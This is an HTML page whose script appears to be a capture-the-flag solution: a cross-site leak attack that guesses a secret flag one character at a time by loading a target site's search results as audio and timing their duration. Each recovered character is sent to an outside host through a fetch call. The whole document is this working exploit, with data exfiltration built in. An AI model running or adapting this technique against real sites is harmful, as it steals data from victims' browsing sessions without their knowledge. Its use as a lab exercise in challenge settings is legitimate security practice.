<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
<script>
    let chars = ` !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_\`abcdefghijklmnopqrstuvwxyz{|}~`;
    let flag = '';
    function send(char) {
        fetch("https://lyj.kr/debug" + flag);
        const audio2 = new Audio(`http://prob.hspace.io:26019/search?query=${encodeURIComponent(flag + char)}`);
        audio2.addEventListener('canplaythrough', (e) => {
            if (audio2.duration == 30.1) {
                console.log('find', char)
                flag += char;
                fetch("https://lyj.kr/flag?flag=" + flag)
                brute();
            }
        })
    }
    function brute() {
        for (let i = 0; i < chars.length; i++) {
            const char = chars[i];
            send(char);
        }
    }
    brute()
</script>
</body>
</html>
